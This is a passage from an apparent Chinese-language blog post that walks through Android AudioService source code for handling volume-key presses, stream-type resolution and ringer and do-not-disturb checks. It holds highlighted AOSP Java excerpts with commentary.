AudioManager.FLAG_PLAY_SOUND</span><br><span class="line">                | AudioManager.FLAG_FROM_KEY;</span><br><span class="line">        <span class="keyword">switch</span> (event.getKeyCode()) &#123;</span><br><span class="line">            <span class="keyword">case</span> KeyEvent.KEYCODE_VOLUME_UP:</span><br><span class="line">                    adjustSuggestedStreamVolume(AudioManager.ADJUST_RAISE,</span><br><span class="line">                            AudioManager.USE_DEFAULT_STREAM_TYPE, flags, callingPackage, caller,</span><br><span class="line">                            Binder.getCallingUid(), <span class="literal">true</span>, keyEventMode);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> KeyEvent.KEYCODE_VOLUME_DOWN:</span><br><span class="line">                    adjustSuggestedStreamVolume(AudioManager.ADJUST_LOWER,</span><br><span class="line">                            AudioManager.USE_DEFAULT_STREAM_TYPE, flags, callingPackage, caller,</span><br><span class="line">                            Binder.getCallingUid(), <span class="literal">true</span>, keyEventMode);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> KeyEvent.KEYCODE_VOLUME_MUTE:</span><br><span class="line">                <span class="keyword">if</span> (event.getAction() == KeyEvent.ACTION_DOWN &amp;&amp; event.getRepeatCount() == <span class="number">0</span>) &#123;</span><br><span class="line">                    adjustSuggestedStreamVolume(AudioManager.ADJUST_TOGGLE_MUTE,</span><br><span class="line">                            AudioManager.USE_DEFAULT_STREAM_TYPE, flags, callingPackage, caller,</span><br><span class="line">                            Binder.getCallingUid(), <span class="literal">true</span>, VOL_ADJUST_NORMAL);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                Log.e(TAG, <span class="string">&quot;Invalid key code &quot;</span> + event.getKeyCode() + <span class="string">&quot; sent by &quot;</span> + callingPackage);</span><br><span class="line">                <span class="keyword">return</span>; <span class="comment">// not needed but added if code gets added below this switch statement</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在handleVolumeKey()方法里面，调用了adjustSuggestedStreamVolume方法，参数含义如下：</p><table><thead><tr><th>按键类型</th><th>Audio Service操作类型</th><th>含义</th></tr></thead><tbody><tr><td>KEYCODE_VOLUME_UP</td><td>AudioManager.ADJUST_RAISE</td><td>音量减</td></tr><tr><td>KEYCODE_VOLUME_DOWN</td><td>AudioManager.ADJUST_LOWER</td><td>音量加</td></tr><tr><td>KEYCODE_VOLUME_MUTE</td><td>AudioManager.ADJUST_TOGGLE_MUTE</td><td>改变静音状态</td></tr></tbody></table><p>在按键的处理过程中，并没有将相应的code传递给AudioService，而是使用了相关的定义，将KEYCODE_VOLUME_UP等操作转化为了ADJUST_RAISE等。而flag存储了一些对音量的要求或者信息。</p><p><strong>frameworks/base/media/java/android/media/AudioManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Increase the ringer volume.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ADJUST_RAISE</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decrease the ringer volume.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ADJUST_LOWER</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Maintain the previous ringer volume. This may be useful when needing to</span></span><br><span class="line"><span class="comment"> * show the volume toast without actually modifying the volume.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ADJUST_SAME</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Mute the volume. Has no effect if the stream is already muted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ADJUST_MUTE</span> <span class="operator">=</span> -<span class="number">100</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Unmute the volume. Has no effect if the stream is not muted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ADJUST_UNMUTE</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Toggle the mute state. If muted the stream will be unmuted. If not muted</span></span><br><span class="line"><span class="comment"> * the stream will be muted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ADJUST_TOGGLE_MUTE</span> <span class="operator">=</span> <span class="number">101</span>;</span><br></pre></td></tr></table></figure><h4 id="2-adjustSuggestedStreamVolume"><a href="#2-adjustSuggestedStreamVolume" class="headerlink" title="2 adjustSuggestedStreamVolume"></a>2 adjustSuggestedStreamVolume</h4><p>接下来就到了AudioService的adjustSuggestedStreamVolume方法里面了:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">adjustSuggestedStreamVolume</span><span class="params">(<span class="type">int</span> direction, <span class="type">int</span> suggestedStreamType, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">            String callingPackage, String caller, <span class="type">int</span> uid)</span> &#123;</span><br><span class="line">   </span><br><span class="line">        <span class="comment">//   ...省略部分代码</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> streamType;</span><br><span class="line">        <span class="keyword">if</span> (mUserSelectedVolumeControlStream) &#123; <span class="comment">// implies mVolumeControlStream != -1</span></span><br><span class="line">            streamType = mVolumeControlStream;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 这里获取到，可能是活动状态的音频流，但是不确定，还有待进一步确认</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">maybeActiveStreamType</span> <span class="operator">=</span> getActiveStreamType(suggestedStreamType);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">boolean</span> activeForReal;</span><br><span class="line">            <span class="keyword">if</span> (maybeActiveStreamType == AudioSystem.STREAM_MUSIC) &#123;</span><br><span class="line">                <span class="comment">// 这里如果STREAM_MUSIC现在在AudioFlinger处理的流中或在最后的0ms中处于活动状态，则为true。</span></span><br><span class="line">                activeForReal = isAfMusicActiveRecently(<span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 会调用native方法，不深究</span></span><br><span class="line">                activeForReal = AudioSystem.isStreamActive(maybeActiveStreamType, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果activeForReal为true或者mVolumeControlStream为-1</span></span><br><span class="line">            <span class="comment">// 那么确定要操作修改的流类型为maybeActiveStreamType对应的流类型</span></span><br><span class="line">            <span class="keyword">if</span> (activeForReal || mVolumeControlStream == -<span class="number">1</span>) &#123;</span><br><span class="line">                streamType = maybeActiveStreamType;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// activeForReal为false并且mVolumeControlStream不为-1</span></span><br><span class="line">                <span class="comment">// 表示用户点击了音量进度条，这时候要操作修改的流类型为mVolumeControlStream对应的流类型</span></span><br><span class="line">                streamType = mVolumeControlStream;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isMute</span> <span class="operator">=</span> isMuteAdjust(direction);</span><br><span class="line">        <span class="comment">// 确保我们获取到的流类型是有效的</span></span><br><span class="line">        ensureValidStreamType(streamType);</span><br><span class="line">        <span class="comment">// 将我们获取到的流，进行流映射，拿到最终需要操作的流类型</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">resolvedStream</span> <span class="operator">=</span> mStreamVolumeAlias[streamType];</span><br><span class="line">        <span class="comment">// Play sounds on STREAM_RING only.</span></span><br><span class="line">        <span class="keyword">if</span> ((flags &amp; AudioManager.FLAG_PLAY_SOUND) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">                resolvedStream != AudioSystem.STREAM_RING) &#123;</span><br><span class="line">            flags &amp;= ~AudioManager.FLAG_PLAY_SOUND;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// For notifications/ring, show the ui before making any adjustments</span></span><br><span class="line">        <span class="comment">// Don&#x27;t suppress mute/unmute requests</span></span><br><span class="line">        <span class="comment">// 通知和响铃，调整音量之前先显示UI。</span></span><br><span class="line">        <span class="keyword">if</span> (mVolumeController.suppressAdjustment(resolvedStream, flags, isMute)) &#123;</span><br><span class="line">            <span class="comment">// 将操作置为ADJUST_SAME（ADJUST_SAME = 0）；</span></span><br><span class="line">            direction = <span class="number">0</span>;</span><br><span class="line">            flags &amp;= ~AudioManager.FLAG_PLAY_SOUND;</span><br><span class="line">            flags &amp;= ~AudioManager.FLAG_VIBRATE;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG_VOL) Log.d(TAG, <span class="string">&quot;Volume controller suppressed adjustment&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 这里设置音量</span></span><br><span class="line">        adjustStreamVolume(streamType, direction, flags, callingPackage, caller, uid);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的有以下几点：</p><ol><li>mUserSelectedVolumeControlStream：这个属性表示，用户是否已通过单击音量进度条选择音量流来更改由音量键控制的音量，如果mVolumeControlStream为-1，那么mUserSelectedVolumeControlStream 为false。说简单点，当用户点击了某个音量条，这时再去按下音量加减，这个时候调节的是你点击的那个流类型。</li><li>getActiveStreamType：获取我们要控制的流的类型，当然，只是可能需要控制的流类型，还需要进一步确认。</li><li>mStreamVolumeAlias[streamType]：进行流映射，获取最终需要调整的流类型</li><li>suppressAdjustment：字面意思为抑制调整，为什么抑制调整呢，说白了，当我们没有显示音量的UI进度条的时候，不管我们是加音量还是减音量（注意：静音和解静音除外），这个时候都是先显示音量条，而不去改变音量的大小。所以当这个方法返回true的时候， direction = 0，这里direction为0就表示我们的操作为ADJUST_SAME，大家可以在AudioManager里面查看ADJUST_SAME的注释就知道这个操作表示只弹出UI但是不调整音量大小。</li><li>adjustStreamVolume：进行音量的调整</li></ol><h4 id="3-adjustStreamVolume"><a href="#3-adjustStreamVolume" class="headerlink" title="3 adjustStreamVolume"></a>3 adjustStreamVolume</h4><p>进入到了adjustStreamVolume函数，该函数比较长，得分片段分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">adjustStreamVolume</span><span class="params">(<span class="type">int</span> streamType, <span class="type">int</span> direction, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">            String callingPackage, String caller, <span class="type">int</span> uid)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mUseFixedVolume) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ensureValidDirection(direction);</span><br><span class="line">        ensureValidStreamType(streamType);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isMuteAdjust</span> <span class="operator">=</span> isMuteAdjust(direction);</span><br><span class="line">        <span class="keyword">if</span> (isMuteAdjust &amp;&amp; !isStreamAffectedByMute(streamType)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// use stream type alias here so that streams with same alias have the same behavior,</span></span><br><span class="line">        <span class="comment">// including with regard to silent mode control (e.g the use of STREAM_RING below and in</span></span><br><span class="line">        <span class="comment">// checkForRingerModeChange() in place of STREAM_RING or STREAM_NOTIFICATION)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">streamTypeAlias</span> <span class="operator">=</span> mStreamVolumeAlias[streamType];</span><br><span class="line">        <span class="type">VolumeStreamState</span> <span class="variable">streamState</span> <span class="operator">=</span> mStreamStates[streamTypeAlias];</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>mUseFixedVolume：表示使用固定音量，我们无法修改音量</li><li>mStreamVolumeAlias[streamType]：进行音频流的映射，拿到映射后的音频流</li><li>mStreamStates[streamTypeAlias]：mStreamStates是一个存储VolumeStreamState类型的数组，保存着每个音频流的状态。VolumeStreamState是AudioService的一个内部类，里面保存单个音频流的所有信息，比如流类型，音量大小，mute状态等。并且相同的流类型，在不同的设备，大小也是不一样的（比如耳机和扬声器，媒体音量大小是不一样的），这也是在VolumeStreamState里面去维护的。）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">adjustStreamVolume</span><span class="params">(<span class="type">int</span> streamType, <span class="type">int</span> direction, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">        String callingPackage, String caller, <span class="type">int</span> uid)</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">device</span> <span class="operator">=</span> getDeviceForStream(streamTypeAlias);</span><br><span class="line">        <span class="type">int</span> <span class="variable">aliasIndex</span> <span class="operator">=</span> streamState.getIndex(device);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">adjustVolume</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> step;</span><br><span class="line">        <span class="comment">// skip a2dp absolute volume control request when the device</span></span><br><span class="line">        <span class="comment">// is not an a2dp device</span></span><br><span class="line">        <span class="comment">// 如果不是蓝牙设备，则跳过音量绝对控制请求 </span></span><br><span class="line">        <span class="keyword">if</span> ((device &amp; AudioSystem.DEVICE_OUT_ALL_A2DP) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (flags &amp; AudioManager.FLAG_BLUETOOTH_ABS_VOLUME) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If we are being called by the system (e.g. hardware keys) check for current user</span></span><br><span class="line">        <span class="comment">// so we handle user restrictions correctly.</span></span><br><span class="line">        <span class="comment">// uid判断，方便去做用户权限处理</span></span><br><span class="line">        <span class="keyword">if</span> (uid == android.os.Process.SYSTEM_UID) &#123;</span><br><span class="line">            uid = UserHandle.getUid(getCurrentUserId(), UserHandle.getAppId(uid));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 权限处理</span></span><br><span class="line">        <span class="keyword">if</span> (mAppOps.noteOp(STREAM_VOLUME_OPS[streamTypeAlias], uid, callingPackage)</span><br><span class="line">                != AppOpsManager.MODE_ALLOWED) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>getDeviceForStream：通过流类型去获取设备类型这里去获取设备类型，通过流类型获取到了对应的VolumeStreamState的实例，然后调用了其observeDevicesForStream_syncVSS方法去获取devices，在observeDevicesForStream_syncVSS方法里面，又会去调用AudioSystem的getDevicesForStream去获取设备，这是个native方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">adjustStreamVolume</span><span class="params">(<span class="type">int</span> streamType, <span class="type">int</span> direction, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">        String callingPackage, String caller, <span class="type">int</span> uid)</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">// 清除掉任何待处理的音量命令</span></span><br><span class="line">        <span class="keyword">synchronized</span> (mSafeMediaVolumeState) &#123;</span><br><span class="line">            mPendingVolumeCommand = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 表示不是固定音量 </span></span><br><span class="line">        flags &amp;= ~AudioManager.FLAG_FIXED_VOLUME;</span><br><span class="line">        <span class="comment">// 如果是多媒体音量，并且是使用固定音量的设备</span></span><br><span class="line">        <span class="keyword">if</span> ((streamTypeAlias == AudioSystem.STREAM_MUSIC) &amp;&amp;</span><br><span class="line">               ((device &amp; mFixedVolumeDevices) != <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// 加上表示固定音量的flag</span></span><br><span class="line">            flags |= AudioManager.FLAG_FIXED_VOLUME;</span><br><span class="line">            <span class="comment">// Always toggle between max safe volume and 0 for fixed volume devices where safe</span></span><br><span class="line">            <span class="comment">// volume is enforced, and max and 0 for the others.</span></span><br><span class="line">            <span class="comment">// This is simulated by stepping by the full allowed volume range</span></span><br><span class="line">            <span class="keyword">if</span> (mSafeMediaVolumeState == SAFE_MEDIA_VOLUME_ACTIVE &amp;&amp;</span><br><span class="line">                    (device &amp; mSafeMediaVolumeDevices) != <span class="number">0</span>) &#123;</span><br><span class="line">                step = safeMediaVolumeIndex(device);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                step = streamState.getMaxIndex();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (aliasIndex != <span class="number">0</span>) &#123;</span><br><span class="line">                aliasIndex = step;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// convert one UI step (+/-1) into a number of internal units on the stream alias</span></span><br><span class="line">            <span class="comment">// 如果不是多媒体音量，或者是多媒体音量但是不是固定音量的设备时</span></span><br><span class="line">            <span class="comment">// 将音量值的步进量从源流类型变换到目标流类型下，由于不同的流类型的音量调节范围不同，所以这个转换是必需的</span></span><br><span class="line">            step = rescaleIndex(<span class="number">10</span>, streamType, streamTypeAlias);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 情景模式的处理</span></span><br><span class="line">        <span class="comment">// If either the client forces allowing ringer modes for this adjustment,</span></span><br><span class="line">        <span class="comment">// or the stream type is one that is affected by ringer modes</span></span><br><span class="line">        <span class="keyword">if</span> (((flags &amp; AudioManager.FLAG_ALLOW_RINGER_MODES) != <span class="number">0</span>) ||</span><br><span class="line">                (streamTypeAlias == getUiSoundsStreamType())) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">ringerMode</span> <span class="operator">=</span> getRingerModeInternal();</span><br><span class="line">            <span class="comment">// do not vibrate if already in vibrate mode</span></span><br><span class="line">            <span class="comment">// 如果已经是震动模式，则不进行震动</span></span><br><span class="line">            <span class="keyword">if</span> (ringerMode == AudioManager.RINGER_MODE_VIBRATE) &#123;</span><br><span class="line">                flags &amp;= ~AudioManager.FLAG_VIBRATE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Check if the ringer mode handles this adjustment. If it does we don&#x27;t</span></span><br><span class="line">            <span class="comment">// need to adjust the volume further.</span></span><br><span class="line">            <span class="comment">// 根据我们的操作来检查是否需要切换情景模式</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> checkForRingerModeChange(aliasIndex, direction, step,</span><br><span class="line">                    streamState.mIsMuted, callingPackage, flags);</span><br><span class="line">            adjustVolume = (result &amp; FLAG_ADJUST_VOLUME) != <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// If suppressing a volume adjustment in silent mode, display the UI hint</span></span><br><span class="line">            <span class="keyword">if</span> ((result &amp; AudioManager.FLAG_SHOW_SILENT_HINT) != <span class="number">0</span>) &#123;</span><br><span class="line">                flags |= AudioManager.FLAG_SHOW_SILENT_HINT;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// If suppressing a volume down adjustment in vibrate mode, display the UI hint</span></span><br><span class="line">            <span class="keyword">if</span> ((result &amp; AudioManager.FLAG_SHOW_VIBRATE_HINT) != <span class="number">0</span>) &#123;</span><br><span class="line">                flags |= AudioManager.FLAG_SHOW_VIBRATE_HINT;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If the ringermode is suppressing media, prevent changes</span></span><br><span class="line">        <span class="comment">// 勿扰模式</span></span><br><span class="line">        <span class="keyword">if</span> (!volumeAdjustmentAllowedByDnd(streamTypeAlias, flags)) &#123;</span><br><span class="line">            adjustVolume = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取旧的音量大小</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">oldIndex</span> <span class="operator">=</span> mStreamStates[streamType].getIndex(device);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>固定音量设备的处理</li><li>音量步进的处理：rescaleIndex方法，将音量值的步进量从源流类型变换到目标流类型下，由于不同的流类型的音量调节范围不同，所以这个转换是必需的。计算按下音量键的音量步进值。这个步进值是10而不是1。在VolumeStreamState中保存的音量值是其实际值的10倍，这是为了在不同流类型之间进行音量转化时能够保证一定精度的一种实现。可以理解为在转化过程中保留了小数点后一位的精度。</li><li>情景模式处理：情景模式的处理就涉及到了音量的调整，以及情景模式的切换，在切换情景模式（震动到响铃除外）的时候，是没有去调整音量的。通过adjustVolume = (result &amp; FLAG_ADJUST_VOLUME) != 0这一句体现出来的。</li><li>勿扰模式处理：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">adjustStreamVolume</span><span class="params">(<span class="type">int</span> streamType, <span class="type">int</span> direction, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">        String callingPackage, String caller, <span class="type">int</span> uid)</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">   </span><br><span class="line">        <span 